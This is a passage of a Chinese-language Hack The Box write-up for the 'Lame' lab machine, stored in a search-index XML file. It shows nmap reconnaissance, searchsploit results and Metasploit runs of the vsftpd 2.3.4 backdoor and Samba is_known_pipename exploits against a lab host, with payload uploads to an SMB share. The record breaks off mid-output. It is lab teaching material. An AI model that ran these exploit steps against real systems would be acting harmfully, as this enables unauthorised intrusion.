<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTB Lame Writeup</title>
      <link href="/2020/10/23/CTF/HTB/HTB%20Lame%20Writeup/"/>
      <url>/2020/10/23/CTF/HTB/HTB%20Lame%20Writeup/</url>
      
        <content type="html"><![CDATA[<p><em>我撰写HTB教程是为了纪录实验的攻击过程和思考过程，从第一个最简单的机器lame开始.</em></p><h4 id="0x00-NMAP扫描端口"><a href="#0x00-NMAP扫描端口" class="headerlink" title="0x00 NMAP扫描端口"></a><strong>0x00 NMAP扫描端口</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T5 -A -v 10.10.10.3</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-01-31 19:34 EST</span><br><span class="line">NSE: Loaded 151 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">Initiating NSE at 19:34</span><br><span class="line">Completed NSE at 19:34, 0.00s elapsed</span><br><span class="line">Initiating NSE at 19:34</span><br><span class="line">Completed NSE at 19:34, 0.00s elapsed</span><br><span class="line">Initiating NSE at 19:34</span><br><span class="line">Completed NSE at 19:34, 0.00s elapsed</span><br><span class="line">Initiating Ping Scan at 19:34</span><br><span class="line">Scanning 10.10.10.3 [4 ports]</span><br><span class="line">Completed Ping Scan at 19:34, 0.59s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 19:34</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 19:34, 0.10s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 19:34</span><br><span class="line">Scanning 10.10.10.3 [1000 ports]</span><br><span class="line">Discovered open port 21&#x2F;tcp on 10.10.10.3</span><br><span class="line">Discovered open port 445&#x2F;tcp on 10.10.10.3</span><br><span class="line">Discovered open port 22&#x2F;tcp on 10.10.10.3</span><br><span class="line">Discovered open port 139&#x2F;tcp on 10.10.10.3</span><br><span class="line">Completed SYN Stealth Scan at 19:35, 25.75s elapsed (1000 total ports)</span><br><span class="line">Initiating Service scan at 19:35</span><br><span class="line">Scanning 4 services on 10.10.10.3</span><br><span class="line">Completed Service scan at 19:35, 12.09s elapsed (4 services on 1 host)</span><br><span class="line">Initiating OS detection (try #1) against 10.10.10.3</span><br><span class="line">Retrying OS detection (try #2) against 10.10.10.3</span><br><span class="line">Initiating Traceroute at 19:35</span><br><span class="line">Completed Traceroute at 19:35, 0.49s elapsed</span><br><span class="line">Initiating Parallel DNS resolution of 2 hosts. at 19:35</span><br><span class="line">Completed Parallel DNS resolution of 2 hosts. at 19:35, 0.23s elapsed</span><br><span class="line">NSE: Script scanning 10.10.10.3.</span><br><span class="line">Initiating NSE at 19:35</span><br><span class="line">NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.</span><br><span class="line">Completed NSE at 19:35, 40.07s elapsed</span><br><span class="line">Initiating NSE at 19:35</span><br><span class="line">Completed NSE at 19:36, 1.19s elapsed</span><br><span class="line">Initiating NSE at 19:36</span><br><span class="line">Completed NSE at 19:36, 0.00s elapsed</span><br><span class="line">Nmap scan report for 10.10.10.3</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21&#x2F;tcp  open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.10.14.20</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd 2.3.4 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)</span><br><span class="line">|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)</span><br><span class="line">139&#x2F;tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445&#x2F;tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.18 (ClarkConnect 4.3 Enterprise Edition) (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 0.872 days (since Thu Jan 30 22:40:01 2020)</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;196 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"> </span><br><span class="line">Host script results:</span><br><span class="line">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_smb-security-mode: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"> </span><br><span class="line">TRACEROUTE (using port 21&#x2F;tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   485.19 ms 10.10.14.1</span><br><span class="line">2   485.32 ms 10.10.10.3</span><br><span class="line"> </span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 19:36</span><br><span class="line">Completed NSE at 19:36, 0.00s elapsed</span><br><span class="line">Initiating NSE at 19:36</span><br><span class="line">Completed NSE at 19:36, 0.00s elapsed</span><br><span class="line">Initiating NSE at 19:36</span><br><span class="line">Completed NSE at 19:36, 0.00s elapsed</span><br><span class="line">Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 87.19 seconds</span><br><span class="line">           Raw packets sent: 3089 (139.504KB) | Rcvd: 50 (2.888KB)</span><br></pre></td></tr></table></figure><p>我们看到开放了21、22、139、445端口.</p><p>简单分析一下,这里包括ftp,ssh和smb端口,没有web服务和其他tcp服务端口.那么我们可以肯定就是ftp服务或者smb服务上有漏洞.</p><h4 id="0x01-FTP侦察"><a href="#0x01-FTP侦察" class="headerlink" title="0x01 FTP侦察"></a><strong>0x01 FTP侦察</strong></h4><p>看下ftp服务:vsftpd2.3.4</p><ul><li><p>检查一下这个服务是否有漏洞:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;# searchsploit vsftp</span><br><span class="line">------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                                                      |  Path</span><br><span class="line">                                                                                    | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">vsftpd 2.0.5 - &#39;CWD&#39; (Authenticated) Remote Memory Consumption                      | exploits&#x2F;linux&#x2F;dos&#x2F;5814.pl</span><br><span class="line">vsftpd 2.0.5 - &#39;deny_file&#39; Option Remote Denial of Service (1)                      | exploits&#x2F;windows&#x2F;dos&#x2F;31818.sh</span><br><span class="line">vsftpd 2.0.5 - &#39;deny_file&#39; Option Remote Denial of Service (2)                      | exploits&#x2F;windows&#x2F;dos&#x2F;31819.pl</span><br><span class="line">vsftpd 2.3.2 - Denial of Service                                                    | exploits&#x2F;linux&#x2F;dos&#x2F;16270.c</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                              | exploits&#x2F;unix&#x2F;remote&#x2F;17491.rb</span><br><span class="line">------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure></li><li><p>可以看到vsftpd2.3.4有一个远程命令执行漏洞,可以在msf中测试一下情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search vsftp</span><br><span class="line"> </span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> </span><br><span class="line">   #  Name                                  Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution</span><br></pre></td></tr></table></figure></li><li><p>接着使用这个exploit：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor</span><br><span class="line">msf5 exploit(unix&#x2F;ftp&#x2F;vsftpd_234_backdoor) &gt; show options </span><br><span class="line"> </span><br><span class="line">Module options (exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor):</span><br><span class="line"> </span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT   21               yes       The target port (TCP)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Payload options (cmd&#x2F;unix&#x2F;interact):</span><br><span class="line"> </span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Exploit target:</span><br><span class="line"> </span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure></li><li><p>设置相关参数如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix&#x2F;ftp&#x2F;vsftpd_234_backdoor) &gt; set rhosts 10.10.10.3</span><br><span class="line">rhosts &#x3D;&gt; 10.10.10.3</span><br><span class="line">msf5 exploit(unix&#x2F;ftp&#x2F;vsftpd_234_backdoor) &gt; show options </span><br><span class="line"> </span><br><span class="line">Module options (exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor):</span><br><span class="line"> </span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT   21               yes       The target port (TCP)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Payload options (cmd&#x2F;unix&#x2F;interact):</span><br><span class="line"> </span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Exploit target:</span><br><span class="line"> </span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure></li><li><p>这里自动配置了payload,不需要我们再设置,那就可以直接执行了,结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix&#x2F;ftp&#x2F;vsftpd_234_backdoor) &gt; exploit</span><br><span class="line"> </span><br><span class="line">[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)</span><br><span class="line">[*] 10.10.10.3:21 - USER: 331 Please specify the password.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure></li><li><p>可以看到,没有这个漏洞存在.</p></li></ul><h4 id="0x02-smb侦察"><a href="#0x02-smb侦察" class="headerlink" title="0x02 smb侦察"></a><strong>0x02 smb侦察</strong></h4><ul><li><p>接着我们就继续看看smb服务中是否有漏洞存在，根据smb的版本，我们搜索一下漏洞情报</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;# searchsploit Samba 3.0</span><br><span class="line">------------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                                                            |  Path</span><br><span class="line">                                                                                          | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">------------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Samba 3.0.10 (OSX) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                      | exploits&#x2F;osx&#x2F;remote&#x2F;16875.rb</span><br><span class="line">Samba 3.0.10 &lt; 3.3.5 - Format String &#x2F; Security Bypass                                    | exploits&#x2F;multiple&#x2F;remote&#x2F;10095.txt</span><br><span class="line">Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit)          | exploits&#x2F;unix&#x2F;remote&#x2F;16320.rb</span><br><span class="line">Samba 3.0.21 &lt; 3.0.24 - LSA trans names Heap Overflow (Metasploit)                        | exploits&#x2F;linux&#x2F;remote&#x2F;9950.rb</span><br><span class="line">Samba 3.0.24 (Linux) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                    | exploits&#x2F;linux&#x2F;remote&#x2F;16859.rb</span><br><span class="line">Samba 3.0.24 (Solaris) - &#39;lsa_io_trans_names&#39; Heap Overflow (Metasploit)                  | exploits&#x2F;solaris&#x2F;remote&#x2F;16329.rb</span><br><span class="line">Samba 3.0.27a - &#39;send_mailslot()&#39; Remote Buffer Overflow                                  | exploits&#x2F;linux&#x2F;dos&#x2F;4732.c</span><br><span class="line">Samba 3.0.29 (Client) - &#39;receive_smb_raw()&#39; Buffer Overflow (PoC)                         | exploits&#x2F;multiple&#x2F;dos&#x2F;5712.pl</span><br><span class="line">Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                          | exploits&#x2F;linux&#x2F;remote&#x2F;364.pl</span><br><span class="line">Samba &lt; 3.0.20 - Remote Heap Overflow                                                     | exploits&#x2F;linux&#x2F;remote&#x2F;7701.txt</span><br><span class="line">------------------------------------------------------------------------------------------ ----------------------------------------</span><br></pre></td></tr></table></figure></li><li><p>接着我们看下msf中的可以直接利用的module</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search linux&#x2F;samba</span><br><span class="line"> </span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> </span><br><span class="line">   #  Name                                     Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                     ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit&#x2F;linux&#x2F;samba&#x2F;chain_reply          2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)</span><br><span class="line">   1  exploit&#x2F;linux&#x2F;samba&#x2F;is_known_pipename    2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load</span><br><span class="line">   2  exploit&#x2F;linux&#x2F;samba&#x2F;lsa_transnames_heap  2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow</span><br><span class="line">   3  exploit&#x2F;linux&#x2F;samba&#x2F;setinfopolicy_heap   2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow</span><br><span class="line">   4  exploit&#x2F;linux&#x2F;samba&#x2F;trans2open           2003-04-07       great      No     Samba trans2open Overflow (Linux x86)</span><br></pre></td></tr></table></figure></li><li><p>选择这个rank是excellent的module试了一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf5 &gt; use exploit&#x2F;linux&#x2F;samba&#x2F;is_known_pipename</span><br><span class="line">msf5 exploit(linux&#x2F;samba&#x2F;is_known_pipename) &gt; show options </span><br><span class="line"> </span><br><span class="line">Module options (exploit&#x2F;linux&#x2F;samba&#x2F;is_known_pipename):</span><br><span class="line"> </span><br><span class="line">   Name            Current Setting  Required  Description</span><br><span class="line">   ----            ---------------  --------  -----------</span><br><span class="line">   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT           445              yes       The SMB service port (TCP)</span><br><span class="line">   SMB_FOLDER                       no        The directory to use within the writeable SMB share</span><br><span class="line">   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Exploit target:</span><br><span class="line"> </span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (Interact)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">msf5 exploit(linux&#x2F;samba&#x2F;is_known_pipename) &gt; set rhosts 10.10.10.3</span><br><span class="line">rhosts &#x3D;&gt; 10.10.10.3</span><br><span class="line">msf5 exploit(linux&#x2F;samba&#x2F;is_known_pipename) &gt; show options </span><br><span class="line"> </span><br><span class="line">Module options (exploit&#x2F;linux&#x2F;samba&#x2F;is_known_pipename):</span><br><span class="line"> </span><br><span class="line">   Name            Current Setting  Required  Description</span><br><span class="line">   ----            ---------------  --------  -----------</span><br><span class="line">   RHOSTS          10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT           445              yes       The SMB service port (TCP)</span><br><span class="line">   SMB_FOLDER                       no        The directory to use within the writeable SMB share</span><br><span class="line">   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Exploit target:</span><br><span class="line"> </span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (Interact)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">msf5 exploit(linux&#x2F;samba&#x2F;is_known_pipename) &gt; exploit </span><br><span class="line"> </span><br><span class="line">[*] 10.10.10.3:445 - Using location \\10.10.10.3\tmp\ for the path</span><br><span class="line">[*] 10.10.10.3:445 - Retrieving the remote path of the share &#39;tmp&#39;</span><br><span class="line">[*] 10.10.10.3:445 - Share &#39;tmp&#39; has server-side path &#39;&#x2F;tmp</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\BLMnxPMz.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;BLMnxPMz.so using \\PIPE\&#x2F;tmp&#x2F;BLMnxPMz.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;BLMnxPMz.so using &#x2F;tmp&#x2F;BLMnxPMz.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\frTMGRHl.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;frTMGRHl.so using \\PIPE\&#x2F;tmp&#x2F;frTMGRHl.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;frTMGRHl.so using &#x2F;tmp&#x2F;frTMGRHl.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\WKxcpBCF.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;WKxcpBCF.so using \\PIPE\&#x2F;tmp&#x2F;WKxcpBCF.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;WKxcpBCF.so using &#x2F;tmp&#x2F;WKxcpBCF.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\oqiKvmfl.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;oqiKvmfl.so using \\PIPE\&#x2F;tmp&#x2F;oqiKvmfl.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;oqiKvmfl.so using &#x2F;tmp&#x2F;oqiKvmfl.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 10.10.10.3:445 - Uploaded payload to \\10.10.10.3\tmp\bwUgUizy.so</span><br><span class="line">[*] 10.10.10.3:445 - Loading the payload from server-side path &#x2F;tmp&#x2F;bwUgUizy.so using \\PIPE\&#x2F;tmp&#x2F;bwUgUizy.so...</span><br><span class="line">[-] 10.10.10.3:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 